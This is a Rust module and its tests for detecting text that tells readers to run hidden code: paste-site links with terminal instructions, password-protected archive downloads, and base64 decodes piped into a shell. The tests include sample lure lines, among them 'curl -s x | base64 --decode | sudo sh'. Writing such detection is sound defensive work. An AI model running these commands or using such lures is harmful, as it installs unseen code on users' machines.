//! Text that hides the code a reader is told to run.
//!
//! Three instructions are recognised, each of which puts the real payload
//! somewhere the file's text does not show:
//!
//! - **Paste site**: a link to a public paste or snippet service next to an
//!   instruction to copy something into a terminal.
//! - **Protected archive**: a link to an archive or executable, a password for
//!   it, and an instruction to run it. The password keeps the archive's
//!   contents from being scanned on download.
//! - **Encoded shell**: a command that decodes base64 and pipes the result into
//!   a shell.
//!
//! Each check looks at a line and the three lines either side of it. Passages
//! that read as a warning or as a description of an attack (a window of six
//! lines either side containing words such as "malicious", "attack",
//! "indicator" or "never") are skipped. All matching is ASCII-only and uses no
//! regular-expression engine, so the result does not depend on locale.

/// How many characters of a file are read.
const MAX_CHARS: usize = 20_000;

/// Lines of context either side of a line for the instruction checks.
const NEAR: usize = 3;

/// Lines of context either side of a line for the warning check.
const WIDE: usize = 6;

/// Address prefixes (after the scheme and an optional `www.`) of public paste
/// and snippet services.
const PASTE_HOSTS: &[&str] = &[
    "glot.io/snippets/",
    "pastebin.com/",
    "rentry.co/",
    "rentry.org/",
    "paste.ee/",
    "hastebin.com/",
    "ghostbin.com/",
    "justpaste.it/",
    "paste.rs/",
    "dpaste.org/",
    "dpaste.com/",
    "controlc.com/",
    "0bin.net/",
    "privatebin.net/",
    "termbin.com/",
    "ix.io/",
    "sprunge.us/",
    "bpa.st/",
    "pastes.io/",
    "textbin.net/",
];

/// File extensions of archives and executables, matched after a dot.
const ARCHIVE_EXTENSIONS: &[&str] = &[
    "zip", "7z", "rar", "tar.gz", "tgz", "exe", "msi", "dmg", "pkg",
];

/// Words that start a warning or a description of an attack. A word counts if
/// it begins with one of these.
const SAFE_PREFIXES: &[&str] = &[
    "attack",
    "pattern",
    "obfuscat",
    "steganograph",
    "malicious",
    "suspicious",
    "indicator",
    "ioc",
    "detect",
    "flag",
    "never",
    "do not",
    "don't",
    "avoid",
    "warning",
    "phishing",
    "exfiltrat",
];

/// Which of the three instructions a line carries.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum LureKind {
    /// A paste-site link next to an instruction to run it in a terminal.
    PasteSite,
    /// An archive or executable link, a password and an instruction to run it.
    ProtectedArchive,
    /// A base64 decode piped into a shell.
    EncodedShell,
}

/// One instruction found in a file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct Lure {
    /// The 1-based line the instruction is on.
    pub line: usize,
    /// Which instruction it is.
    pub kind: LureKind,
}

/// Every instruction of the three kinds in `contents`, in line order.
pub(crate) fn find_lures(contents: &str) -> Vec<Lure> {
    let text: String = contents.chars().take(MAX_CHARS).collect();
    let lines: Vec<String> = text.split('\n').map(str::to_ascii_lowercase).collect();
    let mut found = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        let near = join(&lines, index, NEAR);
        let wide = join(&lines, index, WIDE);
        let safe = has_warning_word(&wide);
        if has_encoded_shell(line) && !safe {
            found.push(Lure {
                line: index + 1,
                kind: LureKind::EncodedShell,
            });
        }
        if has_paste_link(line) && !safe && has_terminal_instruction(&near) {
            found.push(Lure {
                line: index + 1,
                kind: LureKind::PasteSite,
            });
        }
        if has_archive_link(line) && has_password(&near) && has_run_word(&near) {
            found.push(Lure {
                line: index + 1,
                kind: LureKind::ProtectedArchive,
            });
        }
    }
    found
}

/// The lines within `radius` of `index`, joined with newlines.
fn join(lines: &[String], index: usize, radius: usize) -> String {
    let start = index.saturating_sub(radius);
    let end = (index + radius + 1).min(lines.len());
    lines[start..end].join("\n")
}

/// True for ASCII letters, digits and the underscore.
fn is_word_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// Byte offsets where `word` occurs in `haystack` with a word boundary on the
/// left, and, when `whole` is set, on the right too.
fn word_starts(haystack: &str, word: &str, whole: bool) -> Vec<usize> {
    let bytes = haystack.as_bytes();
    let mut starts = Vec::new();
    let mut from = 0;
    while let Some(found) = haystack[from..].find(word) {
        let start = from + found;
        let end = start + word.len();
        let left_ok = start == 0 || !is_word_byte(bytes[start - 1]);
        let right_ok = !whole || end >= bytes.len() || !is_word_byte(bytes[end]);
        if left_ok && right_ok {
            starts.push(start);
        }
        from = start + 1;
    }
    starts
}

/// True if `word` occurs as a whole word.
fn has_word(haystack: &str, word: &str) -> bool {
    !word_starts(haystack, word, true).is_empty()
}

/// True if any of `words` occurs as a whole word.
fn has_any_word(haystack: &str, words: &[&str]) -> bool {
    words.iter().any(|word| has_word(haystack, word))
}

/// True if a warning or attack-description word appears in `text`.
fn has_warning_word(text: &str) -> bool {
    SAFE_PREFIXES
        .iter()
        .any(|prefix| !word_starts(text, prefix, false).is_empty())
}

/// True if a word from `first` is followed on the same line by a word from
/// `second` that starts within `gap` bytes of the first word's end.
fn word_then_word(text: &str, first: &[&str], second: &[&str], gap: usize) -> bool {
    text.split('\n').any(|line| {
        first.iter().any(|a| {
            word_starts(line, a, true).into_iter().any(|start| {
                let end = start + a.len();
                second.iter().any(|b| {
                    word_starts(line, b, true)
                        .into_iter()
                        .any(|at| at >= end && at - end <= gap)
                })
            })
        })
    })
}

/// True if the line links to a public paste or snippet service.
fn has_paste_link(line: &str) -> bool {
    scheme_ends(line).into_iter().any(|end| {
        let rest = &line[end..];
        let rest = rest.strip_prefix("www.").unwrap_or(rest);
        PASTE_HOSTS.iter().any(|host| rest.starts_with(host))
    })
}

/// Byte offsets just after each `http://` or `https://` in `line`.
fn scheme_ends(line: &str) -> Vec<usize> {
    let mut ends = Vec::new();
    for scheme in ["https://", "http://"] {
        let mut from = 0;
        while let Some(found) = line[from..].find(scheme) {
            let start = from + found;
            ends.push(start + scheme.len());
            from = start + scheme.len();
        }
    }
    ends
}

/// True if the passage tells the reader to copy, paste, run or execute
/// something in a terminal or shell.
fn has_terminal_instruction(text: &str) -> bool {
    const VERBS: &[&str] = &["copy", "paste", "run", "execute"];
    const PLACES: &[&str] = &[
        "terminal",
        "shell",
        "powershell",
        "command prompt",
        "cmd",
        "bash",
    ];
    word_then_word(text, VERBS, PLACES, 80)
        || word_then_word(text, &["terminal", "shell", "powershell"], VERBS, 40)
}

/// True if the line links to an archive or executable.
fn has_archive_link(line: &str) -> bool {
    scheme_ends(line).into_iter().any(|end| {
        let token: &str = line[end..]
            .split(|c: char| c.is_ascii_whitespace())
            .next()
            .unwrap_or_default();
        ARCHIVE_EXTENSIONS.iter().any(|extension| {
            let dotted = format!(".{extension}");
            let bytes = token.as_bytes();
            let mut from = 0;
            while let Some(found) = token[from..].find(&dotted) {
                let after = from + found + dotted.len();
                if after >= bytes.len() || !is_word_byte(bytes[after]) {
                    return true;
                }
                from += found + 1;
            }
            false
        })
    })
}

/// True if the passage states a password: `pass`, `password` or `passphrase`
/// followed by `:`, `=` or `is` and a value, or the phrases `using pass` and
/// `with the password`.
fn has_password(text: &str) -> bool {
    if has_phrase(text, "using pass") || has_phrase(text, "with the password") {
        return true;
    }
    ["pass", "password", "passphrase"].iter().any(|word| {
        word_starts(text, word, true).into_iter().any(|start| {
            let rest = text[start + word.len()..].trim_start_matches([' ', '\t']);
            let value = if let Some(after) = rest.strip_prefix([':', '=']) {
                after
            } else if let Some(after) = rest.strip_prefix("is") {
                if after.as_bytes().first().is_some_and(|b| is_word_byte(*b)) {
                    return false;
                }
                after
            } else {
                return false;
            };
            let value = value.trim_start_matches([' ', '\t', '`', '"', '\'']);
            value.as_bytes().first().is_some_and(|b| is_word_byte(*b))
        })
    })
}

/// True if `phrase` occurs with a word boundary on both sides.
fn has_phrase(text: &str, phrase: &str) -> bool {
    !word_starts(text, phrase, true).is_empty()
}

/// True if the passage tells the reader to run, launch or execute something.
fn has_run_word(text: &str) -> bool {
    has_any_word(text, &["run", "launch", "execute"])
}

/// True if the line decodes base64 and pipes the result into a shell.
fn has_encoded_shell(line: &str) -> bool {
    word_starts(line, "base64", true).into_iter().any(|start| {
        let rest = &line[start + "base64".len()..];
        let trimmed = rest.trim_start_matches([' ', '\t']);
        if trimmed.len() == rest.len() {
            return false;
        }
        let flag_len = if trimmed.starts_with("--decode") {
            "--decode".len()
        } else if trimmed.starts_with("-d") {
            "-d".len()
        } else {
            return false;
        };
        let after_flag = &trimmed[flag_len..];
        if after_flag
            .as_bytes()
            .first()
            .is_some_and(|b| is_word_byte(*b))
        {
            return false;
        }
        after_flag
            .match_indices('|')
            .any(|(at, _)| pipes_into_shell(&after_flag[at + 1..]))
    })
}

/// True if `rest`, the text after a pipe, starts with a shell, optionally
/// behind `sudo`.
fn pipes_into_shell(rest: &str) -> bool {
    let rest = rest.trim_start_matches([' ', '\t']);
    let rest = match rest.strip_prefix("sudo") {
        Some(after) if after.starts_with([' ', '\t']) => after.trim_start_matches([' ', '\t']),
        _ => rest,
    };
    ["sh", "bash", "zsh", "dash"].iter().any(|shell| {
        rest.strip_prefix(shell)
            .is_some_and(|after| after.as_bytes().first().is_none_or(|b| !is_word_byte(*b)))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(text: &str) -> Vec<LureKind> {
        find_lures(text).into_iter().map(|lure| lure.kind).collect()
    }

    #[test]
    fn paste_site_with_terminal_instruction() {
        let text = "Visit [this page](https://glot.io/snippets/abc123), copy the script and paste it into Terminal.";
        assert_eq!(kinds(text), vec![LureKind::PasteSite]);
    }

    #[test]
    fn paste_site_without_instruction_is_ignored() {
        let text = "Example output is stored at https://pastebin.com/xyz for later reading.";
        assert_eq!(kinds(text), Vec::new());
    }

    #[test]
    fn paste_site_in_a_warning_is_ignored() {
        let text = "Suspicious skills often link to https://glot.io/snippets/abc and ask you to paste it into a terminal.";
        assert_eq!(kinds(text), Vec::new());
    }

    #[test]
    fn protected_archive_with_password_and_run() {
        let text = "**Windows**: Download [tool](https://github.com/x/y/releases/download/latest/tool.zip) (extract using pass: `openclaw`) and run the executable.";
        assert_eq!(kinds(text), vec![LureKind::ProtectedArchive]);
    }

    #[test]
    fn archive_without_password_is_ignored() {
        let text = "Download https://example.com/tool.zip, unzip it and run the tool.";
        assert_eq!(kinds(text), Vec::new());
    }

    #[test]
    fn the_word_passes_is_not_a_password() {
        let text = "If the test passes:\nDownload https://example.com/file.zip then run it.";
        assert_eq!(kinds(text), Vec::new());
    }

    #[test]
    fn password_forms() {
        assert!(has_password("the password is hunter2"));
        assert!(has_password("pass: `abc`"));
        assert!(has_password("passphrase = abc"));
        assert!(has_password("extract using pass now"));
        assert!(!has_password("the password"));
        assert!(!has_password("passing the tests"));
        assert!(!has_password("this passage is long"));
    }

    #[test]
    fn encoded_shell() {
        let text = "echo \"U2V0dXA=\" | base64 -D | bash";
        assert_eq!(kinds(text), vec![LureKind::EncodedShell]);
        assert_eq!(
            kinds("curl -s x | base64 --decode | sudo sh"),
            vec![LureKind::EncodedShell]
        );
    }

    #[test]
    fn base64_decode_not_piped_to_a_shell_is_ignored() {
        assert_eq!(kinds("echo aGk= | base64 -d > out.txt"), Vec::new());
        assert_eq!(kinds("echo aGk= | base64 -d | shasum"), Vec::new());
        assert_eq!(kinds("base64 -decode | sh"), Vec::new());
    }

    #[test]
    fn encoded_shell_in_an_attack_catalogue_is_ignored() {
        let text =
            "1. Base64 encoding, an obfuscation trick:\n   echo \"Y3VybA==\" | base64 -d | bash";
        assert_eq!(kinds(text), Vec::new());
    }

    #[test]
    fn lines_are_one_based_and_ordered() {
        let text = "intro\n\n\n\n\n\n\n\n\n\nrun: echo aGk= | base64 -d | sh\n";
        let lures = find_lures(text);
        assert_eq!(lures.len(), 1);
        assert_eq!(lures[0].line, 11);
    }

    #[test]
    fn word_helpers_respect_boundaries() {
        assert!(has_word("run it", "run"));
        assert!(!has_word("rerun it", "run"));
        assert!(!has_word("running", "run"));
        assert!(has_warning_word("an attacker"));
        assert!(!has_warning_word("a friendly note"));
    }

    #[test]
    fn archive_link_extensions() {
        assert!(has_archive_link("get https://a.example/x/tool.zip now"));
        assert!(has_archive_link("(https://a.example/tool.tar.gz)"));
        assert!(!has_archive_link("https://a.example/tool.zipper"));
        assert!(!has_archive_link("see tool.zip locally"));
    }
}
